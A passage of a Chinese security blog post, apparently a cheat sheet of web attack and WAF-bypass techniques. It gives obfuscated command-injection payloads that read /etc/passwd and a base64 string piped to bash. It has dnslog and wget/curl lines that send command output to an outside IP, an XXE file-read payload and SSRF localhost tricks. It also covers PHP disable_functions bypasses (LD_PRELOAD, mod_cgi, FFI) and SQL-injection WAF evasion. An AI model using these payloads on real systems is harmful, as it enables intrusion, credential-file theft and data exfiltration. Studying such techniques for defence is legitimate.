+<h2 id="脚本参数"><a href="#脚本参数" class="headerlink" title="脚本参数"></a>脚本参数</h2><ul>
+<li>@</li>
+<li><ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<p> 都代表当前脚本的所有参数，默认为空</p>
+<p><code>c$*a$@t /e$*t$@c/pa$@ssw$@d</code></p>
+<h2 id="空格替换✨"><a href="#空格替换✨" class="headerlink" title="空格替换✨"></a>空格替换✨</h2><p>Linux shell 值为**空格的变量 ${IFS} **</p>
+<p><code>c$*at${IFS}/et$@c/pa$@sswd</code></p>
+<p>{} 包裹 (只有bash环境才能用)</p>
+<p><code>{cat,/etc/passwd} </code></p>
+<p>系统变量定义hex空格 (只有bash环境才能用)</p>
+<p> <code>ABC=$&#39;\x20/etc/passwd&#39;;cat$ABC  </code></p>
+<h2 id="base64编码-✨"><a href="#base64编码-✨" class="headerlink" title="base64编码 ✨"></a>base64编码 ✨</h2><pre><code class="hljs plain">cat /etc/passwd
+echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash
+ec&#x27;&#x27;ho$&#123;IFS&#125;Y2F0IC9ldGMvcGFzc3dk|ba&#x27;&#x27;se&#x27;&#x27;64$&#123;IFS&#125;-d|b&#x27;&#x27;ash</code></pre>
+
+<h2 id="反引号执行"><a href="#反引号执行" class="headerlink" title="反引号执行"></a>反引号执行</h2><p><code>Submit=Submit&amp;ip=www.baidu.com;echo </code>cat &#x2F;etc&#x2F;hosts&#96;&#96;</p>
+<p><code>Submit=Submit&amp;ip=www.baidu.com;echo </code>id&#96;&#96;</p>
+<h2 id="数据外带✨"><a href="#数据外带✨" class="headerlink" title="数据外带✨"></a>数据外带✨</h2><h4 id="dnslog-外带"><a href="#dnslog-外带" class="headerlink" title="dnslog 外带"></a>dnslog 外带</h4><p>ping 或 nslookup</p>
+<p><code>ping -c 1 </code>whoami|base64<code>.f6f0mo.dnslog.cn</code></p>
+<p><a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<h4 id="http-外带"><a href="#http-外带" class="headerlink" title="http 外带"></a>http 外带</h4><p><code>wget &quot;http://101.42.20.101:8000/?</code>id|base64<code>&quot;</code></p>
+<p><code>curl &quot;http://101.42.20.101:8000/?</code>id|base64<code>&quot;</code></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>1 修改JS、替换JS、burp抓包（上传 jpg 文件，修改文件名）</p>
+<p>2 修改MIME 类型（如：后端拦截了 MIME，修改MIME为 image&#x2F;png image&#x2F;jpeg image&#x2F;gif 即可绕过）</p>
+<p>3 修改文件后缀名</p>
+<p>4 先上传一个图片马，再上传一个<code>.htaccess</code>文件（.htaccess 是apache解析策略文件，规定了当前目录的文件怎么解析，目前是：当前目录的所有文件都当做php解析）</p>
+<p>5 GET 型参数 00 截断路径</p>
+<p>前提条件：</p>
+<ul>
+<li><p>php 小于 5.3</p>
+</li>
+<li><p>php 配置 magic_quotes_gpc &#x3D; Off</p>
+</li>
+</ul>
+<p>6 POST 型参数 00 截断路径</p>
+<p>7 上传图片马 + 文件包含解析图片马 (制作的图片马依然是图片，需要借助中间件解析策略 （apache .htaccess） 或文件包含漏洞才能把 图片马 解析执行起来)</p>
+<p>8 可以防御 多次压缩渲染的 图片马</p>
+<p>9 条件竞争（竞争上传+竞争访问）</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="截断"><a href="#截断" class="headerlink" title="@截断"></a>@截断</h2><p><code>http://www.baidu.com@127.0.0.1</code></p>
+<p>等价</p>
+<p><code>http://127.0.0.1</code></p>
+<h2 id="ipv6-绕过"><a href="#ipv6-绕过" class="headerlink" title="ipv6 绕过"></a>ipv6 绕过</h2><p><code>http://[::ffff:127.0.0.1]</code></p>
+<p>等价</p>
+<p><code>http://127.0.0.1</code></p>
+<h2 id="短链接-（302跳转）"><a href="#短链接-（302跳转）" class="headerlink" title="短链接 （302跳转）"></a>短链接 （302跳转）</h2><p>访问 <code>https://reurl.cc/MML4jp</code> 就自动跳转到 <code>https://www.chaitin.cn/training  </code></p>
+<p><a target="_blank" rel="noopener" href="https://reurl.cc/main/cn">https://reurl.cc/main/cn</a></p>
+<h3 id="限制-："><a href="#限制-：" class="headerlink" title="限制 ："></a>限制 ：</h3><ul>
+<li>国内基本关闭</li>
+<li>短链接大部分不支持局域网ip，需要是真实的公网网站才能转成短链接</li>
+<li>很多 ssrf 漏洞不支持自动跳转 （php 的 file_get_contents 函数无法跳转）</li>
+</ul>
+<h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p><code>http://127.0.0.1</code></p>
+<p>可以替换为A记录为127.0.0.1的公共域名，比如 <code>wifi.aliyun.com</code> <code>ecd.tencent.com</code>  <code>localtest.me  </code> 或自己搭建</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h2 id="html-实体编码"><a href="#html-实体编码" class="headerlink" title="html 实体编码"></a>html 实体编码</h2><h3 id="1-编码payload"><a href="#1-编码payload" class="headerlink" title="1  编码payload"></a>1  编码payload</h3><pre><code class="hljs plain">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+    &lt;!DOCTYPE root [
+    &lt;!ENTITY a SYSTEM &quot;file:///etc/passwd&quot;&gt;
+
+]&gt;
+&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
+
+<h3 id="2-去头（xml头和dtd头），去空格和换行"><a href="#2-去头（xml头和dtd头），去空格和换行" class="headerlink" title="2  去头（xml头和dtd头），去空格和换行"></a>2  去头（xml头和dtd头），去空格和换行</h3><p><code>&lt;!ENTITY a SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></p>
+<h3 id="3-html-实体编码"><a href="#3-html-实体编码" class="headerlink" title="3  html 实体编码"></a>3  html 实体编码</h3><h3 id="4-封装新的-payload-参数实体的定义和调用"><a href="#4-封装新的-payload-参数实体的定义和调用" class="headerlink" title="4  封装新的 payload (参数实体的定义和调用)"></a>4  封装新的 payload (参数实体的定义和调用)</h3><pre><code class="hljs plain">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % dc &quot;html实体编码后的内容&quot;&gt; %dc;</code></pre>
+
+<h2 id="UTF16-编码"><a href="#UTF16-编码" class="headerlink" title="UTF16 编码"></a>UTF16 编码</h2><p><code>python utf8to16.py -i 待编码的文件 -o 编码后导出的文件  </code></p>
+<p><code>utf16 不能直接复制粘贴，需要使用 burp 粘贴自文件功能  </code></p>
+<h2 id="php-disable-functions"><a href="#php-disable-functions" class="headerlink" title="php disable functions"></a>php disable functions</h2><h2 id="怎么查看和判断命令执行被禁用"><a href="#怎么查看和判断命令执行被禁用" class="headerlink" title="怎么查看和判断命令执行被禁用"></a>怎么查看和判断命令执行被禁用</h2><p>php禁用函数配置项</p>
+<h4 id="antsword-连接webshell后能看文件，但无法命令执行"><a href="#antsword-连接webshell后能看文件，但无法命令执行" class="headerlink" title="antsword 连接webshell后能看文件，但无法命令执行"></a>antsword 连接webshell后能看文件，但无法命令执行</h4><h4 id="phpinfo-可以看到-disable-functions-配置项"><a href="#phpinfo-可以看到-disable-functions-配置项" class="headerlink" title="phpinfo 可以看到 disable_functions 配置项"></a>phpinfo 可以看到 disable_functions 配置项</h4><h2 id="等价函数代替"><a href="#等价函数代替" class="headerlink" title="等价函数代替"></a>等价函数代替</h2><p><code>假设 disable_functions 配置了 system 函数，可以把 system 替换为 exec 、popen、shell_exec 、passthru  </code></p>
+<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>bypass_disable_functions&#x2F;1</p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="1-antsword-插件下载，右键任意webshell，选择“插件市场”"><a href="#1-antsword-插件下载，右键任意webshell，选择“插件市场”" class="headerlink" title="1  antsword 插件下载，右键任意webshell，选择“插件市场”"></a>1  antsword 插件下载，右键任意webshell，选择“插件市场”</h4><h4 id="2-下载-“绕过-disable-functions”-插件"><a href="#2-下载-“绕过-disable-functions”-插件" class="headerlink" title="2  下载 “绕过 disable_functions” 插件"></a>2  下载 “绕过 disable_functions” 插件</h4><h4 id="3-对无法执行命令的webshell-右键选择使用-绕过disable-functions-插件"><a href="#3-对无法执行命令的webshell-右键选择使用-绕过disable-functions-插件" class="headerlink" title="3  对无法执行命令的webshell 右键选择使用 绕过disable_functions 插件"></a>3  对无法执行命令的webshell 右键选择使用 绕过disable_functions 插件</h4><h4 id="4-选择-LD-PRELOAD-绕过方式"><a href="#4-选择-LD-PRELOAD-绕过方式" class="headerlink" title="4  选择 LD_PRELOAD 绕过方式"></a>4  选择 LD_PRELOAD 绕过方式</h4><h4 id="5-LD-PRELOAD-会自动上传一个-so文件（动态链接库）和-antporxy-php-（新的webshell）"><a href="#5-LD-PRELOAD-会自动上传一个-so文件（动态链接库）和-antporxy-php-（新的webshell）" class="headerlink" title="5  LD_PRELOAD 会自动上传一个 so文件（动态链接库）和 .antporxy.php （新的webshell）"></a>5  LD_PRELOAD 会自动上传一个 so文件（动态链接库）和 .antporxy.php （新的webshell）</h4><h4 id="6-链接新的webshell-antproxy-php-（连接密码与原有webshell一致）-即可实现-disable-functions-绕过"><a href="#6-链接新的webshell-antproxy-php-（连接密码与原有webshell一致）-即可实现-disable-functions-绕过" class="headerlink" title="6  链接新的webshell .antproxy.php （连接密码与原有webshell一致） 即可实现 disable_functions 绕过"></a>6  链接新的webshell .antproxy.php （连接密码与原有webshell一致） 即可实现 disable_functions 绕过</h4><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="LD-PRELOAD-是什么："><a href="#LD-PRELOAD-是什么：" class="headerlink" title="LD_PRELOAD 是什么："></a>LD_PRELOAD 是什么：</h4><p>LD_PRELOAD 是linux 环境变量，值是so文件路径，作用是在新的进程打开时，系统会优先自动 执行 LD_PRELOAD 中指定的so文件</p>
+<h4 id="绕过disable-functions操作原理"><a href="#绕过disable-functions操作原理" class="headerlink" title="绕过disable_functions操作原理"></a>绕过disable_functions操作原理</h4><ul>
+<li>上传一个 恶意的 so 文件，把 LD_PRELOAD 配置为 恶意为 so 文件</li>
+<li>php 的 mail 、 error_log 、 pcntl_exec 、 mb_send_mail 等函数能够打开新的进程，打 开新进程时，会自动加载执行 LD_PRELOAD 指定的 so 文件</li>
+</ul>
+<p><code>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1</code></p>
+<pre><code class="hljs plain">// 1. 设置环境变量，指向你的 so 文件
+putenv(&quot;LD_PRELOAD=/tmp/hack.so&quot;);
+// 2. 触发一个能开启新进程的函数（如 mail）
+mail(&quot;a@b.com&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</code></pre>
+
+<h2 id="apache-mod-cgi"><a href="#apache-mod-cgi" class="headerlink" title="apache mod cgi"></a>apache mod cgi</h2><p>bypass_disable_functions&#x2F;3</p>
+<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p><code>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3</code></p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>上传 .htaccess ，指定 .ant 后缀的文件为 cgi 脚本文件 （shell脚本）</p>
+<pre><code class="hljs plain">Options +ExecCGI
+AddHandler cgi-script .ant</code></pre>
+
+<p>编写shell脚本执行命令</p>
+<pre><code class="hljs plain">#!/bin/bash
+id</code></pre>
+
+<p>apache cgi 能自动执行shell脚本。从而绕过 php disable_functions 的限制</p>
+<h2 id="PHP-fpm"><a href="#PHP-fpm" class="headerlink" title="PHP fpm"></a>PHP fpm</h2><p>bypass_disable_functions&#x2F;5</p>
+<h3 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h3><p>连接新的 .antproxy.php 木马，即可绕过</p>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p><code>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5</code></p>
+<h4 id="使用-php-S"><a href="#使用-php-S" class="headerlink" title="使用 php -S"></a>使用 php -S</h4><p>命令在目标机器上启动一个新的网站，新的网站不受原有php配置的影响，故能绕过 disable_functions</p>
+<h2 id="FFI-拓展"><a href="#FFI-拓展" class="headerlink" title="FFI 拓展"></a>FFI 拓展</h2><p>bypass_disable_functions&#x2F;8</p>
+<h3 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h3><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p><code>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/8</code></p>
+<p>php FFI 拓展，可以在 php 中执行 c语言代码，c语言可以执行命令，不受php配置的影响</p>
+<pre><code class="hljs php"><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);
+<span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami &gt; /tmp/123&quot;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/tmp/123&quot;</span>);
+@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;/tmp/123&quot;</span>);</code></pre>
+
+<h2 id="php-漏洞-系统漏洞"><a href="#php-漏洞-系统漏洞" class="headerlink" title="php 漏洞 &#x2F; 系统漏洞"></a>php 漏洞 &#x2F; 系统漏洞</h2><p><code>https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2</code></p>
+<ul>
+<li>bash 破壳漏洞 CVE-2014-6271 ，antsword 自带bash破壳漏洞 绕过，不需要插件</li>
+<li>php 各种 UAF 漏洞</li>
+</ul>
+<h2 id="通用waf绕过"><a href="#通用waf绕过" class="headerlink" title="通用waf绕过"></a>通用waf绕过</h2><p><code>https://wooyun.js.org/drops/深入了解SQL注入绕过waf和过滤机制.html</code></p>
+<h2 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h2><h3 id="参数重叠"><a href="#参数重叠" class="headerlink" title="参数重叠"></a>参数重叠</h3><p><code>http://192.168.79.120:8081/lab6_hpp.php?id=8639520&amp;id=1&#39; order by 4--+</code></p>
+<p>上述特殊情况，在 <code>apache、 nginx 、iis、 tomcat</code> 中都认为 <code>id=1&#39; order by 9#</code> ，直接忽略<code> id=8639520</code> waf 因为对参数的检测策略不同，<code>可能只检测了 第一个 id</code>，发现第一个 <code>id=8639520</code>，是无危害的</p>
+<h3 id="中间件解析"><a href="#中间件解析" class="headerlink" title="中间件解析"></a>中间件解析</h3><ul>
+<li>waf 经常使用 nginx 、 c 、lua</li>
+<li>网站可能使用 iis 、asp、asp.net</li>
+<li>nginx 和 iis 对同一个参数名或参数值的解析会出现差异</li>
+</ul>
+<p><code>比如参数中出现 ord%er b%y ， nginx 写的waf 得到 ord%er b%y ，无危害，waf放行，进入到 iis 网站时，iis会把 % 自动去掉，变成原本的 order by 产生SQL注入  </code></p>
+<h2 id="脏数据-（缓冲区溢出"><a href="#脏数据-（缓冲区溢出" class="headerlink" title="脏数据 （缓冲区溢出)"></a>脏数据 （缓冲区溢出)</h2><h3 id="大量参数（数量溢出）"><a href="#大量参数（数量溢出）" class="headerlink" title="大量参数（数量溢出）"></a>大量参数（数量溢出）</h3><p>**很多waf有参数检测上线，比如 nginx lua waf默认检测参数的上限是100个，从101个参数开始， 就不会经过waf  **</p>
+<p>**可以用脚本随机生成几百个参数键值对  **</p>
+<p><code>id=1&#39; order by 4--+ </code>是第 101 个参数，如果目标使用了 lua waf，则不会检测第101个参数</p>
+<h3 id="参数值溢出"><a href="#参数值溢出" class="headerlink" title="参数值溢出"></a>参数值溢出</h3><p>POST 数据太多，超过waf的检测范围 (waf 一般只会检测参数值的前几千个字符)</p>
+<h2 id="分块传输-只适用POST请求"><a href="#分块传输-只适用POST请求" class="headerlink" title="分块传输 ,只适用POST请求"></a>分块传输 ,只适用POST请求</h2><p>POST数据不限制大小，服务器怎么知道POST数据的具体大小？</p>
+<ul>
+<li>方法1：通过请求头 Content-length</li>
+<li>方法2：在Transfer-Encoding: Chuncked 启用分块传输的情况下，通过 \r\n 和长度标识区分 大小</li>
+</ul>
+<p>burp插件：（自动把post请求体改为分块传输的格式）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
+<p>正常的 Content-Length 的传输</p>
+<p>使用插件自动修改, 分块传输的格式</p>
+<h4 id="怎么分辨是分块传输"><a href="#怎么分辨是分块传输" class="headerlink" title="怎么分辨是分块传输"></a>怎么分辨是分块传输</h4><ul>
+<li>请求头中有 <code>Transfer-Encoding: chunked</code></li>
+<li>请求体符合分块传输的格式</li>
+</ul>
+<pre><code class="hljs php"><span class="hljs-number">3</span>（长度大小）;RRIUxpACA（注释，随意字符）
+id=（具体数据）
+<span class="hljs-number">2</span>（长度大小）;RzlyLSbC（注释，随意字符）
+<span class="hljs-number">1</span>%（具体数据）
+...........
+<span class="hljs-number">0</span>\r\n
+\r\<span class="hljs-title function_ invoke__">n</span> (<span class="hljs-number">0</span>加上两个回车换行代表请求体结束)
+</code></pre>
+
+<h2 id="waf-白名单"><a href="#waf-白名单" class="headerlink" title="waf 白名单"></a>waf 白名单</h2><p>waf 为了增加速度，就会设置一些白名单的路径或白名单的文件，不检测直接放行，常见js、css</p>
+<p><code>假设waf认为 /static/ 静态资源目录中的所有文件都是白名单  </code></p>
+<h2 id="HTTP-头"><a href="#HTTP-头" class="headerlink" title="HTTP 头"></a>HTTP 头</h2><p>waf 可能会封禁攻击者的ip地址，可以采取使用 http 头的方式伪造 ip 地址尝试绕过</p>
+<p> burp 插件  : <a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/burpFakeIP">https://github.com/TheKingOfDuck/burpFakeIP</a></p>
+<h3 id="burp-burpFakeIP-插件在-Repeater-中的使用"><a href="#burp-burpFakeIP-插件在-Repeater-中的使用" class="headerlink" title="burp burpFakeIP 插件在 Repeater 中的使用"></a>burp burpFakeIP 插件在 Repeater 中的使用</h3><h3 id="常见的代表-IP-的请求头-XFF"><a href="#常见的代表-IP-的请求头-XFF" class="headerlink" title="常见的代表 IP 的请求头  XFF"></a>常见的代表 IP 的请求头  XFF</h3><h5 id="作用都是标识了客户端的"><a href="#作用都是标识了客户端的" class="headerlink" title="作用都是标识了客户端的"></a>作用都是标识了客户端的</h5><h5 id="ip地址-xff-头"><a href="#ip地址-xff-头" class="headerlink" title="ip地址  xff 头"></a>ip地址  xff 头</h5><h4 id="burp-burpFakeIP-插件在爆破中的使用"><a href="#burp-burpFakeIP-插件在爆破中的使用" class="headerlink" title="burp burpFakeIP 插件在爆破中的使用"></a>burp burpFakeIP 插件在爆破中的使用</h4>
+      </div>
+
+      
+      <div class="article__tags reveal">
+        <span class="article__tags-label">标签</span>
+        <div class="tag-list">
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/"><span>Web安全</span></a>
+          
+            <a href="/tags/%E7%BB%95%E8%BF%87/"><span>绕过</span></a>
+          
+            <a href="/tags/WAF/"><span>WAF</span></a>
+          
+        </div>
+      </div>
+      
+
+      <nav class="post-nav reveal" aria-label="前后文章">
+        
+          <a class="post-nav__prev" href="/logic-vulnerabilities/">
+            <span>← 上一篇</span>
+            <strong>逻辑漏洞挖掘实战</strong>
+          </a>
+        
+        
+          <a class="post-nav__next" href="/java-web-vulnerabilities/">
+            <span>下一篇 →</span>
+            <strong>Java Web 常见漏洞</strong>
+          </a>
+        
+      </nav>
+
+      
+      <div class="reward reveal">
+        <button type="button" class="reward__toggle" data-reward-toggle>
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v20M2 7h20v10H2z"/><path d="M12 2a7 7 0 0 1 0 10M12 12a7 7 0 0 0 0 10"/></svg>
+          打赏
+        </button>
+        <div class="reward__box" data-reward-box>
+          <p class="reward__title">你的赏识是我前进的动力</p>
+          <div class="reward__qrs">
+            
+              <figure><img src="/medias/reward/wechat.png" alt="微信赞赏码" loading="lazy"><figcaption>微信</figcaption></figure>
+            
+            
+              <figure><img src="/medias/reward/alipay.jpg" alt="支付宝收款码" loading="lazy"><figcaption>支付宝</figcaption></figure>
+            
+          </div>
+        </div>
+      </div>
+      
+
+      
+      <div class="cbox reveal" id="comments">
+        <div class="cbox__head"><span class="cbox__title">评论</span></div>
+        <div id="gitalk-container"></div>
+      </div>
+      
+    </div>
+  </div>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <div class="site-footer__id">
+      <img class="site-footer__avatar" src="/images/clay-avatar.svg" alt="swfk2154" loading="lazy">
+      <div class="site-footer__id-text">
+        <strong>swfk 的安全笔记</strong>
+        <span>AI 安全 / 网络安全 / 工程实践</span>
+      </div>
+    </div>
+    <div class="site-footer__links">
+      
+        <a href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+          GitHub
+        </a>
+      
+      
+      
+        <a href="/atom.xml">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1.4"/></svg>
+          RSS
+        </a>
+      
+    </div>
+  </div>
+  <div class="site-footer__bar">
+    <span>© 2026 - 2026 swfk2154</span>
+    <span>由 <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> 驱动 · Clay 主题</span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display:none">访客 <span id="busuanzi_value_site_uv"></span></span>
+      <span id="busuanzi_container_site_pv" style="display:none">浏览 <span id="busuanzi_value_site_pv"></span></span>
+    
+  </div>
+</footer>
+
+  
+<div class="search-overlay" id="search-overlay" hidden>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-bar">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      <input type="text" class="search-input" id="search-input" placeholder="搜索文章：标题 / 标签 / 正文…"
+             autocomplete="off" autocapitalize="off" spellcheck="false">
+      <button type="button" class="search-esc" data-search-close aria-label="关闭搜索">Esc</button>
+    </div>
+    <ul class="search-results" id="search-results"></ul>
+    <div class="search-hint">↑ ↓ 选择 · Enter 打开 · Esc 关闭</div>
+  </div>
+</div>
+
+  <button type="button" class="to-top" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M6 11l6-6 6 6"/></svg>
+  </button>
+  
+
+<div class="music-player" data-music-player>
+  <button type="button" class="music-player__toggle" data-music-toggle aria-expanded="false" aria-controls="music-player-panel" aria-label="打开音乐播放器" title="音乐">
+    <span class="music-player__disc" aria-hidden="true">
+      <img class="music-player__disc-cover" data-music-cover alt="" hidden referrerpolicy="no-referrer">
+      <svg class="music-player__disc-note" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+    </span>
+    <span class="music-player__pulse" aria-hidden="true"><i></i><i></i><i></i></span>
+  </button>
+
+  <section class="music-player__panel" id="music-player-panel" data-music-panel aria-hidden="true">
+    <div class="music-player__panel-head">
+      <div class="music-player__head-copy">
+        <span class="music-player__eyebrow">MUSIC</span>
+        <h2>BGM</h2>
+      </div>
+      <button type="button" class="music-player__close" data-music-close aria-label="收起">&#215;</button>
+    </div>
+    
+    <div class="music-player__box">
+      
+      <div class="music-player__pane is-active" data-music-pane="0">
+        <div class="music-player__mount" data-ap-mount="0"></div>
+      </div>
+      
+      
+    </div>
+    <p class="music-player__foot">来自网易云音乐 · 点击列表选曲</p>
+  </section>
+  <script>window.__CLAY_MUSIC__ = {"apis":["https://api.injahow.cn/meting/?server=:server&type=:type&id=:id","https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id"],"sources":[{"server":"netease","type":"playlist","id":"8792942606"}],"order":"list","listMaxHeight":"320px","autoplay":false};</script>
+</div>
+
+
+  
+<script>
+  window.__giscusConfig = {"enable":true,"repo":"swfk2154/swfk2154.github.io","repoId":"R_kgDORBu9qA","category":"Announcements","categoryId":"DIC_kwDORBu9qM4DEDSm","mapping":"pathname","reactionsEnabled":true,"inputPosition":"top","theme":"light","lang":"zh-CN"};
+</script>
+
+<script src="/js/clay.js"></script>
+<script src="/js/search.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/js/music-loader.js"></script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
